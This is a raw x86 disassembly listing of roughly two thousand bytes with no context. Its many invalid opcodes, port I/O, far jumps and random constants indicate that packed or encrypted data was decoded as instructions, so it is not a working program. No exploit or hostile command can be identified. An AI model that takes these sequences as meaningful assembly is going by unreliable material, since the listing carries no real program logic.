  417df2:	mov    dh,0x72
  417df4:	sbb    BYTE PTR [eax+0x3f13b17d],cl
  417dfa:	imul   edi
  417dfc:	jbe    0x417db7
  417dfe:	add    al,0xf1
  417e00:	ins    DWORD PTR es:[edi],dx
  417e01:	sbb    al,BYTE PTR [ecx+0x16]
  417e04:	push   esi
  417e05:	inc    esi
  417e06:	sub    DWORD PTR [ecx],eax
  417e08:	inc    eax
  417e09:	inc    esp
  417e0a:	out    dx,al
  417e0b:	mov    eax,ds:0xf972a338
  417e10:	jle    0x417d98
  417e12:	outs   dx,DWORD PTR ds:[esi]
  417e13:	or     eax,0x4a6ea698
  417e19:	mov    ecx,DWORD PTR [edx-0x43]
  417e1c:	mov    cl,0x4a
  417e1e:	arpl   si,ax
  417e20:	jmp    0x417de0
  417e22:	mov    cl,0xd6
  417e24:	or     bh,bl
  417e26:	push   esi
  417e27:	ja     0x417e3b
  417e29:	mov    ch,0x4f
  417e2b:	and    ah,ah
  417e2d:	and    al,0x1b
  417e30:	in     eax,0xdc
  417e32:	ins    DWORD PTR es:[edi],dx
  417e33:	mov    edi,0xad79b154
  417e38:	and    DWORD PTR [edi],0x4c9f2737
  417e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e3f:	mov    ds,WORD PTR [esi+eiz*4-0x19]
  417e43:	and    eax,0x3d41cf63
  417e48:	shl    DWORD PTR [ecx-0x49],0xc3
  417e4c:	cli    
  417e4d:	push   cs
  417e4e:	xor    dh,BYTE PTR [edi+0x71]
  417e51:	mov    ecx,0x9279eed0
  417e56:	xchg   esp,eax
  417e57:	loope  0x417ecb
  417e59:	inc    edi
  417e5a:	lods   eax,DWORD PTR ds:[esi]
  417e5b:	mov    dl,0x53
  417e5d:	lock inc esp
  417e5f:	sub    esi,eax
  417e61:	sub    BYTE PTR [ecx-0x25],ah
  417e64:	sub    BYTE PTR [edi],dh
  417e66:	dec    edi
  417e67:	fidiv  WORD PTR [edx-0x79]
  417e6a:	push   es
  417e6b:	repnz imul esp,DWORD PTR [esi],0x635c3e74
  417e72:	mov    eax,ds:0x60b72285
  417e77:	dec    esi
  417e78:	xor    DWORD PTR [ecx+0x43],0x495503ec
  417e7f:	and    BYTE PTR fs:[ebx],bh
  417e82:	lods   eax,DWORD PTR ds:[esi]
  417e83:	xchg   ecx,eax
  417e84:	mov    al,0xa1
  417e86:	mov    WORD PTR [eax-0x34745df3],fs
  417e8c:	jae    0x417e1e
  417e8e:	push   ds
  417e8f:	cmc    
  417e90:	push   edx
  417e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e92:	push   edx
  417e93:	cmp    DWORD PTR [edx+ecx*1-0x1c],edi
  417e97:	mov    al,ds:0x6937af0c
  417e9c:	mov    ds,WORD PTR [edx-0x56]
  417e9f:	cs push 0x37f89328
  417ea5:	fwait
  417ea6:	pusha  
  417ea7:	lds    esi,FWORD PTR [ebp+0xd]
  417eaa:	idiv   edx
  417eac:	lahf   
  417ead:	push   ecx
  417eae:	pop    eax
  417eaf:	sti    
  417eb0:	jbe    0x417f23
  417eb2:	cmp    eax,0xa228fd63
  417eb7:	cmp    edi,DWORD PTR [ecx+0x72]
  417eba:	push   0x3826b0ac
  417ebf:	imul   edi,DWORD PTR ds:0xba2d3b9c,0xffffff8c
  417ec6:	ror    DWORD PTR [ebx+0x18],0x32
  417eca:	dec    ebx
  417ecb:	adc    BYTE PTR [esp+eax*2-0x6548bcda],ch
  417ed2:	fnstsw ax
  417ed4:	pop    DWORD PTR [esi]
  417ed6:	(bad)  
  417ed7:	mov    edx,DWORD PTR [eax]
  417ed9:	popf   
  417eda:	add    ecx,DWORD PTR [ebp+ebx*1-0x64d29cdc]
  417ee1:	sub    BYTE PTR [edi-0x45],dh
  417ee4:	xlat   BYTE PTR ds:[ebx]
  417ee5:	pop    es
  417ee6:	inc    esi
  417ee7:	and    esi,ebx
  417ee9:	mov    edi,0x3df15f5d
  417eee:	loop   0x417f0f
  417ef0:	sub    DWORD PTR ds:0x3efd8801,0xffffffdc
  417ef7:	fwait
  417ef8:	adc    ch,BYTE PTR [edx]
  417efa:	xor    eax,0x7ee2e675
  417eff:	mov    ebx,0xff80466
  417f04:	adc    edx,DWORD PTR [edi+esi*4-0x59]
  417f08:	fwait
  417f09:	sub    edi,DWORD PTR [ebx]
  417f0b:	push   ebp
  417f0c:	ins    DWORD PTR es:[edi],dx
  417f0d:	sbb    ecx,eax
  417f0f:	dec    edx
  417f10:	sar    dl,0x4e
  417f13:	ret    0xecf9
  417f16:	jecxz  0x417f00
  417f18:	jne    0x417eee
  417f1a:	ffreep st(7)
  417f1c:	les    ebx,FWORD PTR es:[edx+0x20]
  417f20:	(bad)  
  417f21:	xchg   BYTE PTR [esi],bl
  417f23:	lods   al,BYTE PTR ds:[esi]
  417f24:	(bad)  
  417f25:	xor    ah,BYTE PTR [ebp+0x5a]
  417f28:	jmp    0x786c:0x673b0320
  417f2f:	push   edx
  417f30:	push   edx
  417f31:	(bad)  
  417f32:	(bad)  
  417f33:	mov    dl,0xca
  417f35:	add    ch,BYTE PTR [eax+esi*8]
  417f38:	sbb    BYTE PTR [ebp-0x1262dc8d],0x14
  417f3f:	mov    esi,0xd1e7d46d
  417f44:	adc    esi,DWORD PTR [ecx-0x2088df47]
  417f4a:	sbb    ebp,DWORD PTR [edx+0x3f935ec8]
  417f50:	icebp  
  417f51:	imul   eax,ecx,0x12
  417f54:	or     al,0x10
  417f56:	es fwait
  417f58:	popf   
  417f59:	test   al,0x5b
  417f5b:	aad    0x8f
  417f5d:	xchg   ecx,eax
  417f5e:	sub    al,0x76
  417f60:	in     al,0xad
  417f62:	mov    ebx,0x1ff3bc9c
  417f67:	sbb    eax,0x27a0cb64
  417f6c:	dec    ecx
  417f6d:	mov    ecx,0xb1018c36
  417f72:	in     eax,dx
  417f73:	in     eax,0x52
  417f75:	dec    esp
  417f76:	add    ebp,DWORD PTR [edi]
  417f78:	dec    ecx
  417f79:	jae    0x417f5a
  417f7b:	and    DWORD PTR [ecx+0x6d7a922b],edi
  417f81:	call   0x396c7a1a
  417f86:	out    dx,al
  417f87:	test   al,0x8f
  417f89:	aam    0x53
  417f8b:	ret    0x9b68
  417f8e:	adc    DWORD PTR [edi],esi
  417f90:	ja     0x417f18
  417f92:	sti    
  417f93:	add    al,0x4e
  417f95:	mov    esi,0x53c82d5b
  417f9a:	call   0x288582d7
  417f9f:	push   0xffffff8c
  417fa1:	test   al,0x38
  417fa3:	push   esi
  417fa4:	ud2    
  417fa6:	icebp  
  417fa7:	outs   dx,BYTE PTR ds:[esi]
  417fa8:	arpl   WORD PTR [ecx],dx
  417faa:	into   
  417fab:	lods   eax,DWORD PTR ds:[esi]
  417fac:	push   edx
  417fad:	jecxz  0x417fe0
  417faf:	fwait
  417fb0:	push   esp
  417fb1:	xchg   ebp,eax
  417fb2:	jmp    0x41800b
  417fb4:	(bad)  
  417fb5:	in     al,0xad
  417fb7:	cmp    BYTE PTR [edi-0x5c818f58],dh
  417fbd:	aam    0xac
  417fbf:	push   ss
  417fc0:	sbb    eax,0xe1a07e7b
  417fc5:	fadd   DWORD PTR [edi-0x2a2fe5a7]
  417fcb:	push   cs
  417fcc:	test   DWORD PTR [eax],edx
  417fce:	xchg   ebx,eax
  417fcf:	test   eax,0x2916fa68
  417fd4:	test   DWORD PTR [eax+0x2c6f2540],edi
  417fda:	xchg   al,al
  417fdc:	dec    eax
  417fdd:	fnsave [ebx+0x6a56fb5b]
  417fe3:	gs dec esi
  417fe5:	clc    
  417fe6:	int3   
  417fe7:	pop    edx
  417fe8:	fnstenv [edx+0x7c]
  417feb:	adc    BYTE PTR ds:0x57a46279,dh
  417ff1:	xchg   edx,eax
  417ff2:	mov    esp,0x16eb37b9
  417ff7:	mov    edi,0xce9766ba
  417ffc:	lahf   
  417ffd:	mov    eax,0x876ecc5e
  418002:	sub    al,0x99
  418004:	xor    BYTE PTR [eax],cl
  418006:	nop
  418007:	lahf   
  418008:	bound  ebp,QWORD PTR [edx]
  41800a:	stc    
  41800b:	sahf   
  41800c:	jecxz  0x417fdf
  41800e:	inc    edx
  41800f:	bound  edx,QWORD PTR [ebx+esi*2]
  418012:	scas   eax,DWORD PTR es:[edi]
  418013:	imul   eax,DWORD PTR [eax-0x9],0xffffffb3
  418017:	pop    ss
  418018:	cmp    al,BYTE PTR [eax+edx*8+0x6ae349aa]
  41801f:	sbb    ebp,ecx
  418021:	cdq    
  418022:	or     eax,0x1517a086
  418027:	popa   
  418028:	lahf   
  418029:	xchg   ecx,ebx
  41802b:	inc    ebp
  41802c:	ja     0x418095
  41802e:	pop    ss
  41802f:	rdpmc  
  418031:	addr16 out 0x5d,eax
  418034:	call   0x7f5e:0x9913bd27
  41803b:	loope  0x417fe0
  41803d:	jmp    0x418079
  41803f:	fisttp QWORD PTR [ebp+0x6379251]
  418045:	(bad)  
  418046:	pop    ecx
  418047:	fwait
  418048:	out    dx,eax
  418049:	stos   DWORD PTR es:[edi],eax
  41804a:	fstp   DWORD PTR [esi]
  41804c:	pop    edi
  41804d:	jmp    0x4388:0x38f5d0fb
  418054:	push   ebx
  418055:	or     eax,0xe5007074
  41805a:	sbb    al,0x42
  41805c:	stos   BYTE PTR es:[edi],al
  41805d:	mov    al,ds:0xd4f264e9
  418062:	ins    BYTE PTR es:[edi],dx
  418063:	jg     0x417fe6
  418065:	aam    0xed
  418067:	gs out dx,eax
  418069:	xor    DWORD PTR [edi+0xd],0x422686a5
  418070:	adc    eax,0x653f05e7
  418075:	adc    bl,BYTE PTR [eax+0x3c]
  418078:	dec    ebx
  418079:	lock adc edi,DWORD PTR [edx+0x18]
  41807d:	push   edx
  41807e:	jp     0x41805d
  418080:	pusha  
  418081:	cli    
  418082:	(bad)  
  418083:	leave  
  418084:	rcr    ebp,1
  418086:	jecxz  0x418042
  418088:	sbb    dh,bl
  41808a:	xchg   esp,eax
  41808b:	xchg   ebp,eax
  41808c:	push   ds
  41808d:	pop    ss
  41808e:	jmp    0x46c6a3a0
  418093:	xchg   esi,eax
  418094:	jne    0x41801e
  418096:	cmp    dh,BYTE PTR [ebx+0x4cff0c53]
  41809c:	int3   
  41809d:	mov    esi,0xea1dfa92
  4180a2:	inc    ebx
  4180a3:	cmp    eax,0xffffffbb
  4180a6:	(bad)  
  4180a7:	lock cmovle ebp,DWORD PTR [ebp-0x472c6f93]
  4180af:	mov    eax,ds:0x7f475571
  4180b4:	fucomip st,st(2)
  4180b6:	ins    BYTE PTR es:[edi],dx
  4180b7:	xor    ebx,DWORD PTR [edx+0x50]
  4180ba:	and    ah,cl
  4180bc:	push   ebp
  4180bd:	aad    0x31
  4180bf:	iret   
  4180c0:	div    DWORD PTR [ebx+0x616a2a5a]
  4180c6:	rcl    DWORD PTR [ebx+0x7bfc5d42],0x33
  4180cd:	mov    al,0x26
  4180cf:	daa    
  4180d0:	adc    al,0x73
  4180d2:	push   0xc97d43b7
  4180d7:	nop
  4180d8:	neg    BYTE PTR [ebp+0x30fa474b]
  4180de:	iret   
  4180df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180e0:	stc    
  4180e1:	sbb    BYTE PTR [edi+0x2],ah
  4180e4:	mov    al,BYTE PTR [ebx+eiz*1]
  4180e7:	adc    al,0xd7
  4180e9:	xchg   DWORD PTR [ebp-0x4a],edi
  4180ec:	pop    edx
  4180ed:	push   0x1ba42219
  4180f2:	fsubr  QWORD PTR [eax-0x57]
  4180f5:	sbb    eax,0xee75bd6b
  4180fa:	inc    edi
  4180fb:	addr16 loopne 0x41810a
  4180fe:	inc    ebp
  4180ff:	leave  
  418100:	pop    ebx
  418101:	lods   al,BYTE PTR ds:[esi]
  418102:	dec    ecx
  418103:	lahf   
  418104:	std    
  418105:	sbb    DWORD PTR [eax-0x6fa02889],eax
  41810b:	xchg   ebx,eax
  41810c:	fbstp  TBYTE PTR [edx-0x226bfea9]
  418112:	pop    edi
  418113:	push   esp
  418114:	in     al,dx
  418115:	shl    DWORD PTR [edi+0x57e79b50],cl
  41811b:	jnp    0x4180c7
  41811d:	or     DWORD PTR [ecx],edx
  41811f:	lock inc esp
  418121:	das    
  418122:	inc    eax
  418123:	stos   BYTE PTR es:[edi],al
  418124:	dec    edi
  418125:	inc    ebp
  418126:	pop    ss
  418127:	aas    
  418128:	fstp   TBYTE PTR [esi+0x8]
  41812b:	dec    ecx
  41812c:	test   al,bh
  41812e:	dec    ebx
  41812f:	inc    esp
  418130:	mov    ah,BYTE PTR [ecx-0x6f]
  418133:	sub    al,BYTE PTR [eax-0xf]
  418136:	nop
  418137:	mov    ah,0xe5
  418139:	push   0x42e9db98
  41813e:	sub    esp,esi
  418140:	xchg   esp,eax
  418141:	sub    BYTE PTR [eax+edx*8+0x7a],0x4e
  418146:	pop    esi
  418147:	fwait
  418148:	push   DWORD PTR [ebx+0x18]
  41814b:	daa    
  41814c:	or     esi,DWORD PTR [ecx+0x13]
  41814f:	sub    al,0xb8
  418151:	and    ah,BYTE PTR [edx-0x2c]
  418154:	ficomp DWORD PTR [esi]
  418156:	push   edx
  418157:	imul   edx,DWORD PTR [edi-0x8],0xffffffff
  41815b:	mov    ch,0xfa
  41815d:	lea    esi,[ebx-0x74975884]
  418163:	out    dx,al
  418164:	and    edi,DWORD PTR [ebp+eax*2-0x6e]
  418168:	pop    ds
  418169:	pop    ds
  41816a:	and    edi,edi
  41816c:	jnp    0x418151
  41816e:	test   BYTE PTR [esi+0x17b1a5b5],cl
  418174:	sti    
  418175:	mov    ch,0x31
  418177:	jmp    0x4181e2
  418179:	ds aad 0x9
  41817c:	adc    DWORD PTR [edi+0x55],esi
  41817f:	mov    eax,0xeb0edde
  418184:	jb     0x41811d
  418186:	jne    0x41813f
  418188:	sub    edi,DWORD PTR [esi]
  41818a:	(bad)  
  41818b:	not    BYTE PTR [ecx-0x29]
  41818e:	or     BYTE PTR [esi],bl
  418190:	mov    al,ds:0xd5ca7e3d
  418195:	in     eax,dx
  418196:	sub    edi,DWORD PTR [ecx]
  418198:	(bad)  
  418199:	mov    ah,BYTE PTR [edi+0x22f4d886]
  41819f:	add    eax,0xdb9f1d0c
  4181a4:	mov    edx,0xf0f6ef6e
  4181a9:	xchg   ecx,eax
  4181aa:	loope  0x4181c9
  4181ac:	test   edi,edi
  4181ae:	nop    DWORD PTR [esi-0x7a]
  4181b2:	lahf   
  4181b3:	xchg   esi,eax
  4181b4:	xchg   edx,eax
  4181b5:	xchg   esp,eax
  4181b6:	push   ss
  4181b7:	ss jg  0x418164
  4181ba:	inc    ebp
  4181bb:	(bad)  
  4181bc:	enter  0xd7e7,0x8d
  4181c0:	and    bl,BYTE PTR [edi+0x49ae8d11]
  4181c6:	icebp  
  4181c7:	xor    dh,ah
  4181c9:	pop    eax
  4181ca:	imul   ebx,DWORD PTR [ecx+0x33],0xfffffff7
  4181ce:	sbb    ecx,DWORD PTR [ecx]
  4181d0:	mov    ds:0x4ee09818,eax
  4181d5:	push   ecx
  4181d6:	add    bl,cl
  4181d8:	mov    ch,0x74
  4181da:	cmp    al,0x13
  4181dc:	sbb    al,0x6d
  4181de:	outs   dx,DWORD PTR ds:[esi]
  4181df:	jno    0x4181a7
  4181e1:	mov    cl,0xa9
  4181e3:	std    
  4181e4:	fcmove st,st(5)
  4181e6:	xchg   ecx,eax
  4181e7:	push   ds
  4181e8:	pushf  
  4181e9:	jge    0x41823e
  4181eb:	shr    BYTE PTR [edi+eax*2-0x2a],0x1e
  4181f0:	and    DWORD PTR [edi-0x6ae77bc9],edx
  4181f6:	ficomp DWORD PTR [ebx+0x271e7d29]
  4181fc:	neg    DWORD PTR [ecx+0x39e344a1]
  418202:	xchg   esi,eax
  418203:	adc    dh,BYTE PTR [edx-0x49]
  418206:	shl    DWORD PTR ds:0x2bc9ba3f,1
  41820c:	cmp    al,bh
  41820e:	sbb    eax,0x8da83567
  418213:	sbb    eax,DWORD PTR [ecx+0x1]
  418216:	icebp  
  418217:	inc    edi
  418218:	mov    ds:0xf100385a,eax
  41821d:	and    eax,0x2ced3d98
  418222:	ja     0x418254
  418224:	dec    eax
  418225:	sbb    ebp,DWORD PTR [edx+0x45ee4b19]
  41822b:	xor    ah,BYTE PTR [ebx]
  41822d:	int    0x56
  41822f:	call   0x63cd:0x308d20a7
  418236:	cmc    
  418237:	mov    eax,ds:0x5cf02c97
  41823c:	aaa    
  41823d:	jae    0x4181bf
  41823f:	push   eax
  418240:	pop    ecx
  418241:	cmp    al,0xf5
  418244:	out    0x9e,al
  418246:	xchg   esp,eax
  418247:	add    ah,BYTE PTR [edi-0x4883baf0]
  41824d:	pop    ss
  41824e:	sbb    DWORD PTR [esi-0x3d],eax
  418251:	inc    ebx
  418252:	jne    0x418235
  418254:	jb     0x4181f0
  418256:	adc    eax,0x5569567b
  41825b:	push   ebx
  41825c:	rcl    DWORD PTR [eax-0x4c],cl
  41825f:	shl    DWORD PTR [ecx-0x59c9c579],1
  418265:	jne    0x418202
  418267:	pop    ebp
  418268:	push   ds
  418269:	inc    eax
  41826a:	mov    eax,ds:0xff7562c7
  41826f:	bound  ebx,QWORD PTR [ebx+0x5614acdb]
  418275:	gs or  ebp,ebp
  418278:	pusha  
  418279:	sub    DWORD PTR [edx],eax
  41827b:	mov    dl,0x29
  41827d:	rol    BYTE PTR [ebx-0x6b],1
  418280:	mov    ebp,0x2e36fa2f
  418285:	(bad)  
  418286:	loopne 0x4182a5
  418288:	mov    edi,0xec5d254e
  41828d:	sbb    eax,0x6d4352fd
  418292:	jp     0x41830d
  418294:	imul   ebx,ecx,0x60
  418297:	ja     0x4182fe
  418299:	mov    edx,0x2ab99f51
  41829e:	cmp    dl,ah
  4182a0:	sub    esp,0x7da2379d
  4182a6:	mov    ebp,0x79b8f3ee
  4182ab:	push   esi
  4182ac:	and    BYTE PTR [edx+0x2f3e2b35],bl
  4182b2:	sub    BYTE PTR [eax-0x78],bl
  4182b5:	mov    edx,0x50a2ece3
  4182ba:	rcr    BYTE PTR [eax],1
  4182bc:	cwde   
  4182bd:	fcmovne st,st(1)
  4182bf:	xor    al,al
  4182c1:	std    
  4182c2:	jp     0x418303
  4182c4:	ror    BYTE PTR [edx],0x4c
  4182c7:	out    0xaf,al
  4182c9:	enter  0x71f4,0x33
  4182cd:	pop    edx
  4182ce:	add    al,0x44
  4182d0:	or     BYTE PTR [esi+eiz*1],dl
  4182d3:	outs   dx,BYTE PTR ds:[esi]
  4182d4:	ss fwait
  4182d6:	stc    
  4182d7:	xlat   BYTE PTR ds:[ebx]
  4182d8:	mov    WORD PTR [eax+0x2ca81eae],fs
  4182de:	sbb    eax,0xe7e1e69f
  4182e3:	rcr    ah,cl
  4182e5:	push   0xffffffba
  4182e7:	dec    esp
  4182e8:	sbb    edx,edi
  4182ea:	xchg   edx,eax
  4182eb:	or     al,0xc8
  4182ed:	jmp    0x418363
  4182ef:	fs inc ecx
  4182f1:	push   es
  4182f2:	push   esp
  4182f3:	jno    0x418345
  4182f5:	xchg   BYTE PTR [ecx+ebx*2],bl
  4182f8:	out    0x7e,al
  4182fa:	ja     0x4182af
  4182fc:	or     eax,0x418cfd71
  418301:	imul   ecx,ebx,0xf424d29e
  418307:	repz popf 
  418309:	and    ebx,DWORD PTR [ebx]
  41830b:	mov    dh,0x79
  41830d:	in     eax,dx
  41830e:	inc    esp
  41830f:	ret    0x4f3d
  418312:	add    al,BYTE PTR [esi]
  418314:	sub    al,0x79
  418316:	adc    cl,ch
  418318:	aaa    
  418319:	rcr    DWORD PTR [ebp+edi*8+0x8],0xd9
  41831e:	lods   al,BYTE PTR ds:[esi]
  41831f:	icebp  
  418320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418321:	mov    WORD PTR [eax],ss
  418323:	mov    ds:0x5a365215,eax
  418328:	push   ds
  418329:	inc    edi
  41832a:	push   edi
  41832b:	cdq    
  41832c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41832d:	lods   eax,DWORD PTR ds:[esi]
  41832e:	cmp    al,0x99
  418330:	neg    BYTE PTR [edi]
  418332:	xor    bh,cl
  418334:	sahf   
  418335:	fwait
  418336:	lods   eax,DWORD PTR ds:[esi]
  418337:	repz bound edx,QWORD PTR [edx*1+0x644970d3]
  41833f:	and    al,0xa7
  418341:	and    bl,al
  418343:	push   ebp
  418344:	leave  
  418345:	mov    dh,0xe4
  418347:	and    dl,BYTE PTR [eax+0x4b1b568a]
  41834d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41834e:	adc    eax,0x80876966
  418353:	imul   eax,edx,0xd9be7bf4
  418359:	xchg   ecx,eax
  41835a:	sar    bl,0xaf
  41835d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41835e:	or     al,0x92
  418360:	xlat   BYTE PTR ds:[ebx]
  418361:	ret    0x3607
  418364:	pop    ecx
  418365:	jo     0x418361
  418367:	mov    eax,ds:0x2e0e31d7
  41836c:	adc    eax,0x218adea3
  418371:	cmp    DWORD PTR [edx],ebp
  418373:	pop    es
  418374:	sbb    bl,BYTE PTR [ebx]
  418376:	jb     0x41831d
  418378:	or     DWORD PTR [ecx-0x2c2a627d],ebx
  41837e:	adc    edx,DWORD PTR [eax-0x58d621ba]
  418384:	scas   eax,DWORD PTR es:[edi]
  418385:	jecxz  0x418376
  418387:	push   cs
  418388:	mov    esi,0x50fd9ad0
  41838d:	test   BYTE PTR [eax+ecx*2+0x3],al
  418391:	iret   
  418392:	jo     0x418335
  418394:	push   0xe
  418396:	mov    edi,0x9ef6bfd7
  41839b:	xchg   ebx,eax
  41839c:	push   ss
  41839d:	xor    ebx,DWORD PTR [esi+0x10de5bab]
  4183a3:	mov    al,0x22
  4183a5:	adc    al,BYTE PTR ds:0x29df397d
  4183ab:	cmp    al,0xf8
  4183ad:	call   0x24f1d667
  4183b2:	sbb    bh,BYTE PTR [ebx+0x1e]
  4183b5:	mov    ah,0x41
  4183b7:	cdq    
  4183b8:	sbb    eax,0xa849a50e
  4183bd:	or     ebx,0x82b4ed8f
  4183c3:	les    eax,FWORD PTR [ebx-0x69]
  4183c6:	and    al,0xa7
  4183c8:	ret    
  4183c9:	sbb    ebx,ebp
  4183cb:	jb     0x4183d2
  4183cd:	cmp    ecx,ecx
  4183cf:	adc    esp,ebx
  4183d1:	adc    ah,BYTE PTR [edi]
  4183d3:	iret   
  4183d4:	mov    edi,DWORD PTR [edx-0x5f]
  4183d7:	and    eax,0x702226b
  4183dc:	(bad)  
  4183dd:	pop    ebx
  4183de:	xchg   esp,eax
  4183df:	and    DWORD PTR [edx-0x75f79db3],ebp
  4183e5:	pop    ecx
  4183e6:	std    
  4183e7:	lds    esi,FWORD PTR [ebp-0x51]
  4183ea:	pop    ebx
  4183eb:	xchg   ecx,eax
  4183ec:	sbb    DWORD PTR [ebx-0x14],ebx
  4183ef:	inc    esi
  4183f0:	ins    BYTE PTR es:[edi],dx
  4183f1:	hlt    
  4183f2:	jno    0x4183b9
  4183f4:	test   DWORD PTR [ebx],edi
  4183f6:	in     al,dx
  4183f7:	sub    edx,DWORD PTR [ebx+0xe]
  4183fa:	mov    esp,esi
  4183fc:	fwait
  4183fd:	stos   DWORD PTR es:[edi],eax
  4183fe:	dec    esi
  4183ff:	mov    DWORD PTR [eax+ebp*1],edi
  418402:	dec    esi
  418403:	dec    esi
  418404:	loopne 0x418479
  418406:	test   al,0x8d
  418408:	mov    ah,0xe5
  41840a:	cmp    ebp,DWORD PTR [ebx]
  41840c:	cld    
  41840d:	arpl   WORD PTR [esi-0x70],cx
  418410:	add    ebp,edi
  418412:	and    eax,0x87695350
  418417:	xchg   edx,eax
  418418:	jmp    0xe7d7:0x7333f982
  41841f:	mov    esi,0x47d8fe97
  418424:	sahf   
  418425:	ds (bad) 
  418427:	jo     0x41844d
  418429:	call   0x286aa1db
  41842e:	test   DWORD PTR [eax],edi
  418430:	iret   
  418431:	sbb    al,al
  418433:	push   edx
  418434:	xchg   DWORD PTR [eax+0x3],eax
  418437:	dec    ebp
  418438:	ss pop ecx
  41843a:	es (bad) 
  41843c:	in     al,dx
  41843d:	mov    ds:0xf3f1cdfe,al
  418442:	ja     0x41846a
  418444:	add    ch,BYTE PTR [edi-0x3]
  418447:	xor    eax,0x389bc965
  41844c:	xchg   ebx,eax
  41844d:	loop   0x41848f
  41844f:	mov    edx,0x7efdd13a
  418454:	jmp    0xdac80a24
  418459:	int    0xa8
  41845b:	cmp    esi,DWORD PTR [esi+0x1035a94b]
  418461:	mov    WORD PTR [ebp-0x50],es
  418464:	cmp    edi,DWORD PTR [eax+0x240dabb8]
  41846a:	aam    0x2
  41846c:	cmp    eax,0xaeb55f48
  418471:	inc    esp
  418472:	or     eax,0x232c3ec6
  418477:	jo     0x418492
  418479:	fidiv  DWORD PTR [ecx]
  41847b:	sub    eax,0x2f599ebe
  418480:	xor    eax,0xd9ad8338
  418485:	fcmovnbe st,st(5)
  418487:	cdq    
  418488:	jecxz  0x4184bb
  41848a:	js     0x418472
  41848c:	inc    ebp
  41848d:	inc    edx
  41848e:	xor    edi,DWORD PTR cs:[eax-0x22]
  418492:	loop   0x4184d1
  418494:	inc    BYTE PTR [edi]
  418496:	mov    ds:0x24dd08f3,eax
  41849b:	xor    DWORD PTR [esi+0x3a],eax
  41849e:	retf   
  41849f:	out    0xab,eax
  4184a1:	call   0xbb35:0x7b4d4482
  4184a8:	(bad)  
  4184a9:	and    BYTE PTR [eax-0x3d],bl
  4184ac:	push   edx
  4184ad:	lds    eax,FWORD PTR [eax+0xe3639c8]
  4184b3:	out    0xd2,al
  4184b5:	call   0x19b7:0x484e2894
  4184bc:	mov    al,ds:0x7fe6bea6
  4184c1:	cmp    edx,eax
  4184c3:	push   cs
  4184c4:	sbb    DWORD PTR es:[edx-0x6e],0x75
  4184c9:	sub    al,0xea
  4184cb:	cld    
  4184cc:	xchg   edi,eax
  4184cd:	repz fild QWORD PTR [ebx+0x67db77af]
  4184d4:	mov    ebx,0x9876583f
  4184d9:	sbb    ch,BYTE PTR [esi+0x45fba4ea]
  4184df:	and    esi,esp
  4184e1:	mov    bh,0x98
  4184e3:	jl     0x4184c4
  4184e5:	inc    ecx
  4184e6:	push   ds
  4184e7:	enter  0x1caa,0xe1
  4184eb:	sub    eax,0x70a297c9
  4184f0:	cs dec ecx
  4184f2:	pop    ecx
  4184f3:	test   DWORD PTR [ebx-0x80],esp
  4184f6:	sbb    BYTE PTR ds:0x70d6f32e,0xb9
  4184fd:	cmp    DWORD PTR ds:[edx-0x2b6230a9],esi
  418504:	and    al,0x80
  418506:	push   0xce7a2f5d
  41850b:	sti    
  41850c:	lock or al,BYTE PTR [ecx-0x42]
  418510:	jnp    0x418571
  418512:	hlt    
  418513:	mov    eax,ds:0x4cf4d905
  418518:	fcomp  QWORD PTR [ecx+0x0]
  41851b:	jle    0x418549
  41851d:	ss mov ah,0x4b
  418520:	in     eax,0x6
  418522:	jno    0x4184ec
  418524:	xor    eax,0x77604346
  418529:	dec    eax
  41852a:	add    eax,0xdc04e02a
  41852f:	js     0x418513
  418531:	cmp    eax,0x752a48ac
  418536:	mov    esi,0x1b189669
  41853b:	add    al,BYTE PTR [ebp-0x21472d46]
  418541:	pop    ebp
  418542:	cmp    dl,ch
  418544:	fisub  WORD PTR [ecx+0x59e4949e]
  41854a:	dec    edx
  41854b:	add    ebx,DWORD PTR [ebx+0xfac9d38]
  418551:	setbe  BYTE PTR [edi+0x48]
  418555:	sub    dh,dl
  418557:	fist   DWORD PTR [esi]
  418559:	sbb    al,0x93
  41855b:	out    0x8,al
  41855d:	icebp  
  41855e:	inc    edx
  41855f:	rcr    DWORD PTR [eax+0x2badc82e],0x94
  418566:	popf   
  418567:	aas    
  418568:	or     DWORD PTR [esi+0xd7c9fa1],edx
  41856e:	pop    esi
  41856f:	iret   
  418570:	rcr    DWORD PTR [esi+0xa],cl
  418573:	cmp    BYTE PTR [ecx+0x2138ef45],dh
  418579:	mov    edi,0x337a416a
  41857e:	dec    edi
  41857f:	mov    ebx,0x415cdfff
  418584:	lahf   
  418585:	xlat   BYTE PTR ds:[ebx]
  418586:	call   0xc230358a
  41858b:	bound  edi,QWORD PTR [ebx+ebp*4]
  41858e:	mov    bh,0xc9
  418590:	add    edi,ebp
  418592:	xchg   ebp,eax
  418593:	adc    eax,0xcdc92982
  418598:	leave  
  418599:	cli    
  41859a:	fidiv  WORD PTR [eax]
  41859c:	test   eax,0x4dab7a2f
  4185a1:	and    eax,0x2220f08c
  4185a6:	sbb    cl,BYTE PTR [ecx-0x29]
  4185a9:	ins    BYTE PTR es:[edi],dx
  4185aa:	imul   BYTE PTR [ebx+0x16]
  4185ad:	cmp    BYTE PTR ds:0x14c3c9db,al
  4185b3:	aaa    
  4185b4:	int3   
  4185b5:	stos   BYTE PTR es:[edi],al
  4185b6:	dec    edx
  4185b7:	shl    ebp,cl
  4185b9:	xor    DWORD PTR [eax-0x57],ebx
  4185bc:	pop    DWORD PTR ds:0xe4d8e1a1
  4185c2:	push   cs
  4185c3:	test   eax,0x6706f6d3
  4185c8:	pop    ebp
  4185c9:	inc    esi
  4185ca:	and    dh,BYTE PTR [ebx]
  4185cc:	sub    ch,BYTE PTR [ecx+0x23]
  4185cf:	push   0xbea418c4
  4185d4:	adc    ebp,ebp
  4185d6:	daa    
  4185d7:	repz rcl BYTE PTR ds:0xe7fcf73b,cl
  4185de:	mov    al,0x87
  4185e0:	retf   0xbd87
  4185e3:	fstp   QWORD PTR [edx]
  4185e5:	push   eax
  4185e6:	js     0x4185fc
  4185e8:	fcmovnbe st,st(1)
  4185ea:	mov    dh,0xf0
  4185ec:	inc    esp
  4185ed:	mov    edx,0xd0490d55
